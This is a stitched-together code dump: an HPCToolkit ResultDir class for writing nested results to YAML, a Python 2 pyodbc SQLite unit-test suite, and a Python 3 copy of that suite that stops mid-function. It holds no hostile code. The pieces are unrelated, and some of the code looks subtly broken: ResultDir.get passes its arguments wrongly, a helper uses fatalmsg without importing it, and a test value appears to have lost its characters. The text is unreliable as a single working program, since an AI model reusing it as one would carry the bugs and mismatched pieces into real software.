#  Information about sources of support for research and development of        #
#  HPCToolkit is at 'hpctoolkit.org' and in 'README.Acknowledgments'.          #
#  --------------------------------------------------------------------------- #
#                                                                              #
#  Copyright ((c)) 2002-2017, Rice University                                  #
#  All rights reserved.                                                        #
#                                                                              #
#  Redistribution and use in source and binary forms, with or without          #
#  modification, are permitted provided that the following conditions are      #
#  met:                                                                        #
#                                                                              #
#  * Redistributions of source code must retain the above copyright            #
#    notice, this list of conditions and the following disclaimer.             #
#                                                                              #
#  * Redistributions in binary form must reproduce the above copyright         #
#    notice, this list of conditions and the following disclaimer in the       #
#    documentation and/or other materials provided with the distribution.      #
#                                                                              #
#  * Neither the name of Rice University (RICE) nor the names of its           #
#    contributors may be used to endorse or promote products derived from      #
#    this software without specific prior written permission.                  #
#                                                                              #
#  This software is provided by RICE and contributors "as is" and any          #
#  express or implied warranties, including, but not limited to, the           #
#  implied warranties of merchantability and fitness for a particular          #
#  purpose are disclaimed. In no event shall RICE or contributors be           #
#  liable for any direct, indirect, incidental, special, exemplary, or         #
#  consequential damages (including, but not limited to, procurement of        #
#  substitute goods or services; loss of use, data, or profits; or             #
#  business interruption) however caused and on any theory of liability,       #
#  whether in contract, strict liability, or tort (including negligence        #
#  or otherwise) arising in any way out of the use of this software, even      #
#  if advised of the possibility of such damage.                               #
#                                                                              #
################################################################################


from common import options, debugmsg



class ResultDir():
    
    def __init__(self, parentdir, name):

        from collections import OrderedDict
        from os import makedirs
        from os.path import join

        self.name = name
        self.dir = join(parentdir, "_" + self.name)
        makedirs(self.dir)
        self.outdict = OrderedDict()
        self.numOutfiles = 0


    def __contains__(self, key):
        
        return key in self.outdict
        
    
    def getDir(self):

        return self.dir
        
    
    def makePath(self, nameFmt, label=None):

        from os.path import join

        self.numOutfiles += 1
        path = join(self.dir, ("{:02d}-" + nameFmt).format(self.numOutfiles, label))
        return path


    def add(self, *keysOrValues, **kwargs):
        
        from collections import OrderedDict
        from common import assertmsg, fatalmsg
        
        assertmsg(len(keysOrValues) >= 2, "Output.add must receive at least 2 arguments")
        
        # decompose arguments
        keyPath = kwargs.get("subroot", []) + list(keysOrValues[:-1])   # last element of 'keysOrValues' is the value
        lastKey = keysOrValues[-2]  # used to store 'value', but also included in 'keyPath'
        value   = keysOrValues[-1]

        # perform insertion
        ob = self._findValueForPath(*keyPath)                    
        fmt = kwargs.get("format", None)
        ob[lastKey] = value if fmt is None else float(fmt.format(value))


    def get(self, *keyPath):
        
        return self._findValueForPath(keyPath)                    


    def addSummaryStatus(self, status, msg):
        
        self.add("summary", "status",     status)
        self.add("summary", "status msg", msg)
        

    def write(self):

        from os.path import join
        from spackle import writeYamlFile

        writeYamlFile(join(self.dir, "{}.yaml".format(self.name)), self.outdict)


    def _isCompatible(self, key, collection):
        
        from collections import OrderedDict
        from common import fatalmsg
    
        ktype, ctype = type(key), type(collection)
        
        if ktype is str:
            return ctype is dict or ctype is OrderedDict
        elif ktype is int:
            return ctype is list
        else:
            fatalmsg("ResultDir._isCompatible: invalid key type ({})".format(ktype))
    
    
    def _findValueForPath(self, *keyPath):                    
    
        ob = self.outdict
        for k, key in enumerate(keyPath[:-1]):    # last key in 'keyPath' is not traversed, but used to store given 'value'
            if self._isCompatible(key, ob):
                if key not in ob:
                    nextkey = keyPath[k+1]                    
                    ob[key] = self._collectionForKey(nextkey)
                ob = ob[key]
            else:
                fatalmsg("ResultDir: invalid key for current collection in key path")
        return ob
    
    
    def _collectionForKey(self, key):
    
        from collections import OrderedDict
        from common import fatalmsg
    
        ktype = type(key)
        
        if ktype is str:
            return OrderedDict()
        elif ktype is int:
            return list()
        else:
            fatalmsg("ResultDir._collectionForKey: invalid key type ({})".format(ktype))





#!/usr/bin/python
# -*- coding: latin-1 -*-

usage = """\
usage: %prog [options] connection_string

Unit tests for SQLite using the ODBC driver from http://www.ch-werner.de/sqliteodbc

To use, pass a connection string as the parameter. The tests will create and
drop tables t1 and t2 as necessary.  On Windows, use the 32-bit driver with
32-bit Python and the 64-bit driver with 64-bit Python (regardless of your
operating system bitness).

These run using the version from the 'build' directory, not the version
installed into the Python directories.  You must run python setup.py build
before running the tests.

You can also put the connection string into a setup.cfg file in the root of the project                    
(the same one setup.py would use) like so:                    

  [sqlitetests]
  connection-string=Driver=SQLite3 ODBC Driver;Database=sqlite.db
"""

import sys, os, re
import unittest
from decimal import Decimal
from datetime import datetime, date, time
from os.path import join, getsize, dirname, abspath
from testutils import *

_TESTSTR = '0123456789-abcdefghijklmnopqrstuvwxyz-'

def _generate_test_string(length):
    """
    Returns a string of `length` characters, constructed by repeating _TESTSTR as necessary.

    To enhance performance, there are 3 ways data is read, based on the length of the value, so most data types are
    tested with 3 lengths.  This function helps us generate the test data.

    We use a recognizable data set instead of a single character to make it less likely that "overlap" errors will
    be hidden and to help us manually identify where a break occurs.
    """
    if length <= len(_TESTSTR):
        return _TESTSTR[:length]

    c = (length + len(_TESTSTR)-1) / len(_TESTSTR)
    v = _TESTSTR * c
    return v[:length]

class SqliteTestCase(unittest.TestCase):

    SMALL_FENCEPOST_SIZES = [ 0, 1, 255, 256, 510, 511, 512, 1023, 1024, 2047, 2048, 4000 ]
    LARGE_FENCEPOST_SIZES = [ 4095, 4096, 4097, 10 * 1024, 20 * 1024 ]

    ANSI_FENCEPOSTS    = [ _generate_test_string(size) for size in SMALL_FENCEPOST_SIZES ]
    UNICODE_FENCEPOSTS = [ unicode(s) for s in ANSI_FENCEPOSTS ]
    IMAGE_FENCEPOSTS   = ANSI_FENCEPOSTS + [ _generate_test_string(size) for size in LARGE_FENCEPOST_SIZES ]

    def __init__(self, method_name, connection_string):
        unittest.TestCase.__init__(self, method_name)
        self.connection_string = connection_string

    def setUp(self):
        self.cnxn   = pyodbc.connect(self.connection_string)
        self.cursor = self.cnxn.cursor()

        for i in range(3):
            try:
                self.cursor.execute("drop table t%d" % i)
                self.cnxn.commit()
            except:
                pass

        self.cnxn.rollback()

    def tearDown(self):
        try:
            self.cursor.close()
            self.cnxn.close()
        except:
            # If we've already closed the cursor or connection, exceptions are thrown.
            pass

    def test_multiple_bindings(self):
        "More than one bind and select on a cursor"
        self.cursor.execute("create table t1(n int)")
        self.cursor.execute("insert into t1 values (?)", 1)
        self.cursor.execute("insert into t1 values (?)", 2)
        self.cursor.execute("insert into t1 values (?)", 3)
        for i in range(3):
            self.cursor.execute("select n from t1 where n < ?", 10)
            self.cursor.execute("select n from t1 where n < 3")
        

    def test_different_bindings(self):
        self.cursor.execute("create table t1(n int)")
        self.cursor.execute("create table t2(d datetime)")
        self.cursor.execute("insert into t1 values (?)", 1)
        self.cursor.execute("insert into t2 values (?)", datetime.now())

    def test_drivers(self):
        p = pyodbc.drivers()
        self.assertTrue(isinstance(p, list))

    def test_datasources(self):
        p = pyodbc.dataSources()
        self.assertTrue(isinstance(p, dict))

    def test_getinfo_string(self):
        value = self.cnxn.getinfo(pyodbc.SQL_CATALOG_NAME_SEPARATOR)
        self.assertTrue(isinstance(value, str))

    def test_getinfo_bool(self):
        value = self.cnxn.getinfo(pyodbc.SQL_ACCESSIBLE_TABLES)
        self.assertTrue(isinstance(value, bool))

    def test_getinfo_int(self):
        value = self.cnxn.getinfo(pyodbc.SQL_DEFAULT_TXN_ISOLATION)
        self.assertTrue(isinstance(value, (int, long)))

    def test_getinfo_smallint(self):
        value = self.cnxn.getinfo(pyodbc.SQL_CONCAT_NULL_BEHAVIOR)
        self.assertTrue(isinstance(value, int))

    def test_fixed_unicode(self):
        value = u"t\xebsting"
        self.cursor.execute("create table t1(s nchar(7))")
        self.cursor.execute("insert into t1 values(?)", u"t\xebsting")
        v = self.cursor.execute("select * from t1").fetchone()[0]
        self.assertEqual(type(v), unicode)
        self.assertEqual(len(v), len(value)) # If we alloc'd wrong, the test below might work because of an embedded NULL
        self.assertEqual(v, value)


    def _test_strtype(self, sqltype, value, colsize=None):
        """
        The implementation for string, Unicode, and binary tests.
        """
        assert colsize is None or (value is None or colsize >= len(value))

        if colsize:
            sql = "create table t1(s %s(%s))" % (sqltype, colsize)
        else:
            sql = "create table t1(s %s)" % sqltype

        self.cursor.execute(sql)
        self.cursor.execute("insert into t1 values(?)", value)
        v = self.cursor.execute("select * from t1").fetchone()[0]
        self.assertEqual(type(v), type(value))

        if value is not None:
            self.assertEqual(len(v), len(value))

        self.assertEqual(v, value)

        # Reported by Andy Hochhaus in the pyodbc group: In 2.1.7 and earlier, a hardcoded length of 255 was used to
        # determine whether a parameter was bound as a SQL_VARCHAR or SQL_LONGVARCHAR.  Apparently SQL Server chokes if
        # we bind as a SQL_LONGVARCHAR and the target column size is 8000 or less, which is considers just SQL_VARCHAR.
        # This means binding a 256 character value would cause problems if compared with a VARCHAR column under
        # 8001. We now use SQLGetTypeInfo to determine the time to switch.
        #
        # [42000] [Microsoft][SQL Server Native Client 10.0][SQL Server]The data types varchar and text are incompatible in the equal to operator.

        self.cursor.execute("select * from t1 where s=?", value)


    def _test_strliketype(self, sqltype, value, colsize=None):
        """
        The implementation for text, image, ntext, and binary.

        These types do not support comparison operators.
        """
        assert colsize is None or (value is None or colsize >= len(value))

        if colsize:
            sql = "create table t1(s %s(%s))" % (sqltype, colsize)
        else:
            sql = "create table t1(s %s)" % sqltype

        self.cursor.execute(sql)
        self.cursor.execute("insert into t1 values(?)", value)
        v = self.cursor.execute("select * from t1").fetchone()[0]
        self.assertEqual(type(v), type(value))

        if value is not None:
            self.assertEqual(len(v), len(value))

        self.assertEqual(v, value)

    #
    # text
    #

    def test_text_null(self):
        self._test_strtype('text', None, 100)

    # Generate a test for each fencepost size: test_text_0, etc.
    def _maketest(value):
        def t(self):
            self._test_strtype('text', value, len(value))
        return t
    for value in UNICODE_FENCEPOSTS:
        locals()['test_text_%s' % len(value)] = _maketest(value)

    def test_text_upperlatin(self):
        self._test_strtype('varchar', u'')

    #
    # blob
    #

    def test_null_blob(self):
        self._test_strtype('blob', None, 100)
     
    def test_large_null_blob(self):
        # Bug 1575064
        self._test_strtype('blob', None, 4000)

    # Generate a test for each fencepost size: test_unicode_0, etc.
    def _maketest(value):
        def t(self):
            self._test_strtype('blob', bytearray(value), len(value))
        return t
    for value in ANSI_FENCEPOSTS:
        locals()['test_blob_%s' % len(value)] = _maketest(value)

    def test_subquery_params(self):
        """Ensure parameter markers work in a subquery"""
        self.cursor.execute("create table t1(id integer, s varchar(20))")
        self.cursor.execute("insert into t1 values (?,?)", 1, 'test')
        row = self.cursor.execute("""
                                  select x.id
                                  from (
                                    select id
                                    from t1
                                    where s = ?
                                      and id between ? and ?
                                   ) x
                                   """, 'test', 1, 10).fetchone()
        self.assertNotEqual(row, None)
        self.assertEqual(row[0], 1)

    def _exec(self):
        self.cursor.execute(self.sql)
        
    def test_close_cnxn(self):
        """Make sure using a Cursor after closing its connection doesn't crash."""

        self.cursor.execute("create table t1(id integer, s varchar(20))")
        self.cursor.execute("insert into t1 values (?,?)", 1, 'test')
        self.cursor.execute("select * from t1")

        self.cnxn.close()
        
        # Now that the connection is closed, we expect an exception.  (If the code attempts to use
        # the HSTMT, we'll get an access violation instead.)
        self.sql = "select * from t1"
        self.assertRaises(pyodbc.ProgrammingError, self._exec)

    def test_empty_unicode(self):
        self.cursor.execute("create table t1(s nvarchar(20))")
        self.cursor.execute("insert into t1 values(?)", u"")

    def test_unicode_query(self):
        self.cursor.execute(u"select 1")
        
    def test_negative_row_index(self):
        self.cursor.execute("create table t1(s varchar(20))")
        self.cursor.execute("insert into t1 values(?)", "1")
        row = self.cursor.execute("select * from t1").fetchone()
        self.assertEqual(row[0], "1")
        self.assertEqual(row[-1], "1")

    def test_version(self):
        self.assertEqual(3, len(pyodbc.version.split('.'))) # 1.3.1 etc.

    #
    # ints and floats
    #

    def test_int(self):
        value = 1234
        self.cursor.execute("create table t1(n int)")
        self.cursor.execute("insert into t1 values (?)", value)
        result = self.cursor.execute("select n from t1").fetchone()[0]
        self.assertEqual(result, value)

    def test_negative_int(self):
        value = -1
        self.cursor.execute("create table t1(n int)")
        self.cursor.execute("insert into t1 values (?)", value)
        result = self.cursor.execute("select n from t1").fetchone()[0]
        self.assertEqual(result, value)

    def test_bigint(self):
        input = 3000000000
        self.cursor.execute("create table t1(d bigint)")
        self.cursor.execute("insert into t1 values (?)", input)
        result = self.cursor.execute("select d from t1").fetchone()[0]
        self.assertEqual(result, input)

    def test_negative_bigint(self):
        # Issue 186: BIGINT problem on 32-bit architeture
        input = -430000000
        self.cursor.execute("create table t1(d bigint)")
        self.cursor.execute("insert into t1 values (?)", input)
        result = self.cursor.execute("select d from t1").fetchone()[0]
        self.assertEqual(result, input)

    def test_float(self):
        value = 1234.567
        self.cursor.execute("create table t1(n float)")
        self.cursor.execute("insert into t1 values (?)", value)
        result = self.cursor.execute("select n from t1").fetchone()[0]
        self.assertEqual(result, value)

    def test_negative_float(self):
        value = -200
        self.cursor.execute("create table t1(n float)")
        self.cursor.execute("insert into t1 values (?)", value)
        result  = self.cursor.execute("select n from t1").fetchone()[0]
        self.assertEqual(value, result)

    #
    # rowcount
    #

    # Note: SQLRowCount does not define what the driver must return after a select statement
    # and says that its value should not be relied upon.  The sqliteodbc driver is hardcoded to
    # return 0 so I've deleted the test.

    def test_rowcount_delete(self):
        self.assertEqual(self.cursor.rowcount, -1)
        self.cursor.execute("create table t1(i int)")
        count = 4
        for i in range(count):
            self.cursor.execute("insert into t1 values (?)", i)
        self.cursor.execute("delete from t1")
        self.assertEqual(self.cursor.rowcount, count)

    def test_rowcount_nodata(self):
        """
        This represents a different code path than a delete that deleted something.

        The return value is SQL_NO_DATA and code after it was causing an error.  We could use SQL_NO_DATA to step over
        the code that errors out and drop down to the same SQLRowCount code.  On the other hand, we could hardcode a
        zero return value.
        """
        self.cursor.execute("create table t1(i int)")
        # This is a different code path internally.
        self.cursor.execute("delete from t1")
        self.assertEqual(self.cursor.rowcount, 0)

    # In the 2.0.x branch, Cursor.execute sometimes returned the cursor and sometimes the rowcount.  This proved very
    # confusing when things went wrong and added very little value even when things went right since users could always
    # use: cursor.execute("...").rowcount

    def test_retcursor_delete(self):
        self.cursor.execute("create table t1(i int)")
        self.cursor.execute("insert into t1 values (1)")
        v = self.cursor.execute("delete from t1")
        self.assertEqual(v, self.cursor)

    def test_retcursor_nodata(self):
        """
        This represents a different code path than a delete that deleted something.

        The return value is SQL_NO_DATA and code after it was causing an error.  We could use SQL_NO_DATA to step over
        the code that errors out and drop down to the same SQLRowCount code.
        """
        self.cursor.execute("create table t1(i int)")
        # This is a different code path internally.
        v = self.cursor.execute("delete from t1")
        self.assertEqual(v, self.cursor)

    def test_retcursor_select(self):
        self.cursor.execute("create table t1(i int)")
        self.cursor.execute("insert into t1 values (1)")
        v = self.cursor.execute("select * from t1")
        self.assertEqual(v, self.cursor)

    #
    # misc
    #

    def test_lower_case(self):
        "Ensure pyodbc.lowercase forces returned column names to lowercase."

        # Has to be set before creating the cursor, so we must recreate self.cursor.

        pyodbc.lowercase = True
        self.cursor = self.cnxn.cursor()

        self.cursor.execute("create table t1(Abc int, dEf int)")
        self.cursor.execute("select * from t1")

        names = [ t[0] for t in self.cursor.description ]
        names.sort()

        self.assertEqual(names, [ "abc", "def" ])

        # Put it back so other tests don't fail.
        pyodbc.lowercase = False
        
    def test_row_description(self):
        """
        Ensure Cursor.description is accessible as Row.cursor_description.
        """
        self.cursor = self.cnxn.cursor()
        self.cursor.execute("create table t1(a int, b char(3))")
        self.cnxn.commit()
        self.cursor.execute("insert into t1 values(1, 'abc')")

        row = self.cursor.execute("select * from t1").fetchone()

        self.assertEqual(self.cursor.description, row.cursor_description)
        

    def test_executemany(self):
        self.cursor.execute("create table t1(a int, b varchar(10))")

        params = [ (i, str(i)) for i in range(1, 6) ]

        self.cursor.executemany("insert into t1(a, b) values (?,?)", params)

        count = self.cursor.execute("select count(*) from t1").fetchone()[0]
        self.assertEqual(count, len(params))

        self.cursor.execute("select a, b from t1 order by a")
        rows = self.cursor.fetchall()
        self.assertEqual(count, len(rows))

        for param, row in zip(params, rows):
            self.assertEqual(param[0], row[0])
            self.assertEqual(param[1], row[1])


    def test_executemany_one(self):
        "Pass executemany a single sequence"
        self.cursor.execute("create table t1(a int, b varchar(10))")

        params = [ (1, "test") ]

        self.cursor.executemany("insert into t1(a, b) values (?,?)", params)

        count = self.cursor.execute("select count(*) from t1").fetchone()[0]
        self.assertEqual(count, len(params))

        self.cursor.execute("select a, b from t1 order by a")
        rows = self.cursor.fetchall()
        self.assertEqual(count, len(rows))

        for param, row in zip(params, rows):
            self.assertEqual(param[0], row[0])
            self.assertEqual(param[1], row[1])
        

    def test_executemany_failure(self):
        """
        Ensure that an exception is raised if one query in an executemany fails.
        """
        self.cursor.execute("create table t1(a int, b varchar(10))")

        params = [ (1, 'good'),
                   ('error', 'not an int'),
                   (3, 'good') ]
        
        self.assertRaises(pyodbc.Error, self.cursor.executemany, "insert into t1(a, b) value (?, ?)", params)

        
    def test_row_slicing(self):
        self.cursor.execute("create table t1(a int, b int, c int, d int)");
        self.cursor.execute("insert into t1 values(1,2,3,4)")

        row = self.cursor.execute("select * from t1").fetchone()

        result = row[:]
        self.assertTrue(result is row)

        result = row[:-1]
        self.assertEqual(result, (1,2,3))

        result = row[0:4]
        self.assertTrue(result is row)


    def test_row_repr(self):
        self.cursor.execute("create table t1(a int, b int, c int, d int)");
        self.cursor.execute("insert into t1 values(1,2,3,4)")

        row = self.cursor.execute("select * from t1").fetchone()

        result = str(row)
        self.assertEqual(result, "(1, 2, 3, 4)")

        result = str(row[:-1])
        self.assertEqual(result, "(1, 2, 3)")

        result = str(row[:1])
        self.assertEqual(result, "(1,)")


    def test_view_select(self):
        # Reported in forum: Can't select from a view?  I think I do this a lot, but another test never hurts.

        # Create a table (t1) with 3 rows and a view (t2) into it.
        self.cursor.execute("create table t1(c1 int identity(1, 1), c2 varchar(50))")
        for i in range(3):
            self.cursor.execute("insert into t1(c2) values (?)", "string%s" % i)
        self.cursor.execute("create view t2 as select * from t1")

        # Select from the view
        self.cursor.execute("select * from t2")
        rows = self.cursor.fetchall()
        self.assertTrue(rows is not None)
        self.assertTrue(len(rows) == 3)

    def test_autocommit(self):
        self.assertEqual(self.cnxn.autocommit, False)

        othercnxn = pyodbc.connect(self.connection_string, autocommit=True)
        self.assertEqual(othercnxn.autocommit, True)

        othercnxn.autocommit = False
        self.assertEqual(othercnxn.autocommit, False)

    def test_unicode_results(self):
        "Ensure unicode_results forces Unicode"
        othercnxn = pyodbc.connect(self.connection_string, unicode_results=True)
        othercursor = othercnxn.cursor()

        # ANSI data in an ANSI column ...
        othercursor.execute("create table t1(s varchar(20))")
        othercursor.execute("insert into t1 values(?)", 'test')

        # ... should be returned as Unicode
        value = othercursor.execute("select s from t1").fetchone()[0]
        self.assertEqual(value, u'test')

    def test_skip(self):
        # Insert 1, 2, and 3.  Fetch 1, skip 2, fetch 3.

        self.cursor.execute("create table t1(id int)");
        for i in range(1, 5):
            self.cursor.execute("insert into t1 values(?)", i)
        self.cursor.execute("select id from t1 order by id")
        self.assertEqual(self.cursor.fetchone()[0], 1)
        self.cursor.skip(2)
        self.assertEqual(self.cursor.fetchone()[0], 4)

    def test_sets_execute(self):
        # Only lists and tuples are allowed.
        def f():
            self.cursor.execute("create table t1 (word varchar (100))")
            words = set (['a'])
            self.cursor.execute("insert into t1 (word) VALUES (?)", [words])

        self.assertRaises(pyodbc.ProgrammingError, f)

    def test_sets_executemany(self):
        # Only lists and tuples are allowed.
        def f():
            self.cursor.execute("create table t1 (word varchar (100))")
            words = set (['a'])
            self.cursor.executemany("insert into t1 (word) values (?)", [words])
            
        self.assertRaises(TypeError, f)

    def test_row_execute(self):
        "Ensure we can use a Row object as a parameter to execute"
        self.cursor.execute("create table t1(n int, s varchar(10))")
        self.cursor.execute("insert into t1 values (1, 'a')")
        row = self.cursor.execute("select n, s from t1").fetchone()
        self.assertNotEqual(row, None)

        self.cursor.execute("create table t2(n int, s varchar(10))")
        self.cursor.execute("insert into t2 values (?, ?)", row)
        
    def test_row_executemany(self):
        "Ensure we can use a Row object as a parameter to executemany"
        self.cursor.execute("create table t1(n int, s varchar(10))")

        for i in range(3):
            self.cursor.execute("insert into t1 values (?, ?)", i, chr(ord('a')+i))

        rows = self.cursor.execute("select n, s from t1").fetchall()
        self.assertNotEqual(len(rows), 0)

        self.cursor.execute("create table t2(n int, s varchar(10))")
        self.cursor.executemany("insert into t2 values (?, ?)", rows)
        
    def test_description(self):
        "Ensure cursor.description is correct"

        self.cursor.execute("create table t1(n int, s text)")
        self.cursor.execute("insert into t1 values (1, 'abc')")
        self.cursor.execute("select * from t1")

        # (I'm not sure the precision of an int is constant across different versions, bits, so I'm hand checking the
        # items I do know.

        # int
        t = self.cursor.description[0]
        self.assertEqual(t[0], 'n')
        self.assertEqual(t[1], int)
        self.assertEqual(t[5], 0)       # scale
        self.assertEqual(t[6], True)    # nullable

        # text
        t = self.cursor.description[1]
        self.assertEqual(t[0], 's')
        self.assertEqual(t[1], str)
        self.assertEqual(t[5], 0)       # scale
        self.assertEqual(t[6], True)    # nullable

    def test_row_equal(self):
        self.cursor.execute("create table t1(n int, s varchar(20))")
        self.cursor.execute("insert into t1 values (1, 'test')")
        row1 = self.cursor.execute("select n, s from t1").fetchone()
        row2 = self.cursor.execute("select n, s from t1").fetchone()
        b = (row1 == row2)
        self.assertEqual(b, True)

    def test_row_gtlt(self):
        self.cursor.execute("create table t1(n int, s varchar(20))")
        self.cursor.execute("insert into t1 values (1, 'test1')")
        self.cursor.execute("insert into t1 values (1, 'test2')")
        rows = self.cursor.execute("select n, s from t1 order by s").fetchall()
        self.assertTrue(rows[0] < rows[1])
        self.assertTrue(rows[0] <= rows[1])
        self.assertTrue(rows[1] > rows[0])
        self.assertTrue(rows[1] >= rows[0])
        self.assertTrue(rows[0] != rows[1])

        rows = list(rows)
        rows.sort() # uses <
        
    def _test_context_manager(self):
        # TODO: This is failing, but it may be due to the design of sqlite.  I've disabled it
        # for now until I can research it some more.

        # WARNING: This isn't working right now.  We've set the driver's autocommit to "off",
        # but that doesn't automatically start a transaction.  I'm not familiar enough with the
        # internals of the driver to tell what is going on, but it looks like there is support
        # for the autocommit flag.
        #
        # I thought it might be a timing issue, like it not actually starting a txn until you
        # try to do something, but that doesn't seem to work either.  I'll leave this in to
        # remind us that it isn't working yet but we need to contact the SQLite ODBC driver
        # author for some guidance.

        with pyodbc.connect(self.connection_string) as cnxn:
            cursor = cnxn.cursor()
            cursor.execute("begin")
            cursor.execute("create table t1(i int)")
            cursor.execute('rollback')

        # The connection should be closed now.
        def test():
            cnxn.execute('rollback')
        self.assertRaises(pyodbc.Error, test)

    def test_untyped_none(self):
        # From issue 129
        value = self.cursor.execute("select ?", None).fetchone()[0]
        self.assertEqual(value, None)
        
    def test_large_update_nodata(self):
        self.cursor.execute('create table t1(a blob)')
        hundredkb = 'x'*100*1024
        self.cursor.execute('update t1 set a=? where 1=0', (hundredkb,))

    def test_no_fetch(self):
        # Issue 89 with FreeTDS: Multiple selects (or catalog functions that issue selects) without fetches seem to
        # confuse the driver.
        self.cursor.execute('select 1')
        self.cursor.execute('select 1')
        self.cursor.execute('select 1')


def main():
    from optparse import OptionParser
    parser = OptionParser(usage=usage)
    parser.add_option("-v", "--verbose", default=0, action="count", help="Increment test verbosity (can be used multiple times)")
    parser.add_option("-d", "--debug", action="store_true", default=False, help="Print debugging items")
    parser.add_option("-t", "--test", help="Run only the named test")

    (options, args) = parser.parse_args()

    if len(args) > 1:
        parser.error('Only one argument is allowed.  Do you need quotes around the connection string?')

    if not args:
        connection_string = load_setup_connection_string('sqlitetests')

        if not connection_string:
            parser.print_help()
            raise SystemExit()
    else:
        connection_string = args[0]

    if options.verbose:
        cnxn = pyodbc.connect(connection_string)
        print_library_info(cnxn)
        cnxn.close()

    suite = load_tests(SqliteTestCase, options.test, connection_string)

    testRunner = unittest.TextTestRunner(verbosity=options.verbose)
    result = testRunner.run(suite)

    sys.exit(result.errors and 1 or 0)


if __name__ == '__main__':

    # Add the build directory to the path so we're testing the latest build, not the installed version.

    add_to_path()

    import pyodbc
    main()

#!/usr/bin/python
# -*- coding: latin-1 -*-

usage = """\
usage: %prog [options] connection_string

Unit tests for SQLite using the ODBC driver from http://www.ch-werner.de/sqliteodbc

To use, pass a connection string as the parameter. The tests will create and
drop tables t1 and t2 as necessary.  On Windows, use the 32-bit driver with
32-bit Python and the 64-bit driver with 64-bit Python (regardless of your
operating system bitness).

These run using the version from the 'build' directory, not the version
installed into the Python directories.  You must run python setup.py build
before running the tests.

You can also put the connection string into a setup.cfg file in the root of the project                    
(the same one setup.py would use) like so:                    

  [sqlitetests]
  connection-string=Driver=SQLite3 ODBC Driver;Database=sqlite.db
"""

import sys, os, re
import unittest
from decimal import Decimal
from datetime import datetime, date, time
from os.path import join, getsize, dirname, abspath
from testutils import *

_TESTSTR = '0123456789-abcdefghijklmnopqrstuvwxyz-'

def _generate_test_string(length):
    """
    Returns a string of `length` characters, constructed by repeating _TESTSTR as necessary.

    To enhance performance, there are 3 ways data is read, based on the length of the value, so most data types are
    tested with 3 lengths.  This function helps us generate the test data.

    We use a recognizable data set instead of a single character to make it less likely that "overlap" errors will
    be hidden and to help us manually identify where a break occurs.
    """
    if length <= len(_TESTSTR):
        return _TESTSTR[:length]

    c = (length + len(_TESTSTR)-1) // len(_TESTSTR)
    v = _TESTSTR * c
    return v[:length]

class SqliteTestCase(unittest.TestCase):

    SMALL_FENCEPOST_SIZES = [ 0, 1, 255, 256, 510, 511, 512, 1023, 1024, 2047, 2048, 4000 ]
    LARGE_FENCEPOST_SIZES = [ 4095, 4096, 4097, 10 * 1024, 20 * 1024 ]

    STR_FENCEPOSTS = [ _generate_test_string(size) for size in SMALL_FENCEPOST_SIZES ]
    BYTE_FENCEPOSTS    = [ bytes(s, 'ascii') for s in STR_FENCEPOSTS ]
    IMAGE_FENCEPOSTS   = BYTE_FENCEPOSTS + [ bytes(_generate_test_string(size), 'ascii') for size in LARGE_FENCEPOST_SIZES ]

    def __init__(self, method_name, connection_string):
        unittest.TestCase.__init__(self, method_name)
        self.connection_string = connection_string

    def setUp(self):
        self.cnxn   = pyodbc.connect(self.connection_string)
        self.cursor = self.cnxn.cursor()

        for i in range(3):
            try:
                self.cursor.execute("drop table t%d" % i)
                self.cnxn.commit()
            except:
                pass

        self.cnxn.rollback()

    def tearDown(self):
        try:
            self.cursor.close()
            self.cnxn.close()
        except:
            # If we've already closed the cursor or connection, exceptions are thrown.
            pass

    def test_multiple_bindings(self):
        "More than one bind and select on a cursor"
        self.cursor.execute("create table t1(n int)")
        self.cursor.execute("insert into t1 values (?)", 1)
        self.cursor.execute("insert into t1 values (?)", 2)
        self.cursor.execute("insert into t1 values (?)", 3)
        for i in range(3):
            self.cursor.execute("select n from t1 where n < ?", 10)
            self.cursor.execute("select n from t1 where n < 3")
        

    def test_different_bindings(self):
        self.cursor.execute("create table t1(n int)")
        self.cursor.execute("create table t2(d datetime)")
        self.cursor.execute("insert into t1 values (?)", 1)
        self.cursor.execute("insert into t2 values (?)", datetime.now())

    def test_drivers(self):
        p = pyodbc.drivers()
        self.assertTrue(isinstance(p, list))

    def test_datasources(self):
        p = pyodbc.dataSources()
        self.assertTrue(isinstance(p, dict))

    def test_getinfo_string(self):
        value = self.cnxn.getinfo(pyodbc.SQL_CATALOG_NAME_SEPARATOR)
        self.assertTrue(isinstance(value, str))

    def test_getinfo_bool(self):
        value = self.cnxn.getinfo(pyodbc.SQL_ACCESSIBLE_TABLES)
        self.assertTrue(isinstance(value, bool))

    def test_getinfo_int(self):
        value = self.cnxn.getinfo(pyodbc.SQL_DEFAULT_TXN_ISOLATION)
        self.assertTrue(isinstance(value, int))

    def test_getinfo_smallint(self):
        value = self.cnxn.getinfo(pyodbc.SQL_CONCAT_NULL_BEHAVIOR)
        self.assertTrue(isinstance(value, int))

    def _test_strtype(self, sqltype, value, colsize=None):
        """
        The implementation for string, Unicode, and binary tests.
        """
        assert colsize is None or (value is None or colsize >= len(value))

        if colsize:
            sql = "create table t1(s %s(%s))" % (sqltype, colsize)
        else:
            sql = "create table t1(s %s)" % sqltype

        self.cursor.execute(sql)
        self.cursor.execute("insert into t1 values(?)", value)
        v = self.cursor.execute("select * from t1").fetchone()[0]
        self.assertEqual(type(v), type(value))

        if value is not None:
            self.assertEqual(len(v), len(value))

        self.assertEqual(v, value)

        # Reported by Andy Hochhaus in the pyodbc group: In 2.1.7 and earlier, a hardcoded length of 255 was used to
        # determine whether a parameter was bound as a SQL_VARCHAR or SQL_LONGVARCHAR.  Apparently SQL Server chokes if
        # we bind as a SQL_LONGVARCHAR and the target column size is 8000 or less, which is considers just SQL_VARCHAR.
        # This means binding a 256 character value would cause problems if compared with a VARCHAR column under
        # 8001. We now use SQLGetTypeInfo to determine the time to switch.
        #
        # [42000] [Microsoft][SQL Server Native Client 10.0][SQL Server]The data types varchar and text are incompatible in the equal to operator.

        self.cursor.execute("select * from t1 where s=?", value)


    def _test_strliketype(self, sqltype, value, colsize=None):
        """
        The implementation for text, image, ntext, and binary.

        These types do not support comparison operators.
        """
        assert colsize is None or (value is None or colsize >= len(value))

        if colsize:
            sql = "create table t1(s %s(%s))" % (sqltype, colsize)
        else:
            sql = "create table t1(s %s)" % sqltype

        self.cursor.execute(sql)
        self.cursor.execute("insert into t1 values(?)", value)
        v = self.cursor.execute("select * from t1").fetchone()[0]
        self.assertEqual(type(v), type(value))

        if value is not None:
            self.assertEqual(len(v), len(value))

        self.assertEqual(v, value)

    #
    # text
    #

    def test_text_null(self):
        self._test_strtype('text', None, 100)

    # Generate a test for each fencepost size: test_text_0, etc.
    def _maketest(value):
        def t(self):
